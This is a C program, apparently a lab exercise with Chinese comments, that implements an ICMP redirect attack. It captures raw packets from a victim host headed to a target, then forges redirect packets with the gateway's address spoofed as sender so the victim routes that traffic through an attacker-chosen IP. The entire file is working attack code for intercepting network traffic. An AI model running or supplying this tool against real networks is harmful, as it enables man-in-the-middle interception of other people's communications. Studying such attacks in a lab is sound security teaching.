#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<netinet/ip_icmp.h>
#include<netinet/tcp.h>
#include<netinet/udp.h>
#include<arpa/inet.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<netinet/ether.h>
#define BUFFSIZE 1024


//
struct packet{
        struct iphdr ip_header;
        struct icmp my_icmp;
}packet;
struct sockaddr_in dest;
//计算校验和
unsigned short in_cksum(unsigned short *addr, int len)
{
        int sum=0;
        unsigned short res=0;
        while( len > 1)  {
                sum += *addr++;
                len -=2;
               // printf("sum is %x.\n",sum);
        }
        if( len == 1) {
                *((unsigned char *)(&res))=*((unsigned char *)addr);
                sum += res;
        }
        sum = (sum >>16) + (sum & 0xffff);
        sum += (sum >>16) ;
        res = ~sum;
        return res;
}
int main(int argc,char *argv[]){

	int recvsock;//用于接收以太网帧的socket
	int sendsock;//用于构造重定向ICMP的socket
	unsigned char buff[BUFFSIZE];
	unsigned char* gateway_ip ;
	unsigned char* victim_ip;
	unsigned char* target_ip;
	unsigned char* attacker_ip;
	
	if(argc < 5){
		printf("please enter the ip of gateway victim target attacker");
		return -1;
	}
	//将命令行参数分别保存给对应IP地址
	gateway_ip = argv[1];
	victim_ip = argv[2];
	target_ip = argv[3];
	attacker_ip = argv[4];

	printf("the victim is %s\n", victim_ip);


	
    	dest.sin_family=AF_INET;
    	dest.sin_addr.s_addr=inet_addr(victim_ip);

	//create the socket for capturing the very packet
	recvsock = socket(AF_PACKET,SOCK_RAW,htons(ETH_P_ALL));
	if(recvsock < 0){
		printf("raw recvsocket error!\n");
		exit(1);
	}
	
	sendsock = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP);
	//since we want to send packet as a gateway, we should change the IPheader 
	const int on = 1;
	if(setsockopt(sendsock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(int)) < 0)
	{	
 	 printf("set socket option error!\n");
	}

	int res;
	while(1){
		res = recvfrom(recvsock, buff, BUFFSIZE, 0, NULL, NULL);
		if(res < 0){
		printf("receive error!\n");
		return -2;
		}
		struct ip *ip = (struct ip*)(buff+14);
		if(strcmp(inet_ntoa(ip->ip_src), victim_ip) != 0  ){
			continue;
		}
		if (strcmp(inet_ntoa(ip->ip_dst), target_ip) != 0) {
    			continue;
		}
		
		
		

		//next, we will create the redirect packet and send to the victim as a gateway continually
		//first, we create the ip header
		struct packet redirect_pack;
		redirect_pack.ip_header.version = 4;
		redirect_pack.ip_header.ihl = 5;// per 4 bytes
		redirect_pack.ip_header.tos = 0;
		redirect_pack.ip_header.tot_len = htons(56);//packet total length
		redirect_pack.ip_header.id = getpid();
		redirect_pack.ip_header.frag_off = 0;
		redirect_pack.ip_header.ttl = 64;
		redirect_pack.ip_header.protocol = IPPROTO_ICMP;
		redirect_pack.ip_header.check = 0; //checksum set 0 ,finally we will get the correct number
		redirect_pack.ip_header.saddr = inet_addr(gateway_ip);
		redirect_pack.ip_header.daddr = inet_addr(victim_ip);
		//then, we create the partion of IP data (ICMP) of the redirect packet
		redirect_pack.my_icmp.icmp_type = ICMP_REDIRECT;
		redirect_pack.my_icmp.icmp_code = ICMP_REDIR_HOST;
		redirect_pack.my_icmp.icmp_cksum = 0;
		redirect_pack.my_icmp.icmp_hun.ih_gwaddr.s_addr = inet_addr(attacker_ip);//here is the very keypoint 
		//we need to pad something with the packet we captured 
		memcpy(&redirect_pack.my_icmp.icmp_dun, ip, 28);//the padding part include the ip header + 8bytes ip data
		//calculate the checksum again
		redirect_pack.ip_header.check = in_cksum(&(redirect_pack.ip_header), sizeof(redirect_pack.ip_header));
		redirect_pack.my_icmp.icmp_cksum = in_cksum(&(redirect_pack.my_icmp), 36);
		
		//now we can send the icmp redirect packet
		printf("发往 %15s 的包现在被发到了%15s\n",target_ip,attacker_ip);
		sendto(sendsock, &redirect_pack, 56, 0, (struct sockaddr *)&dest, sizeof(dest));
	}
	close(recvsock);
	close(sendsock);


}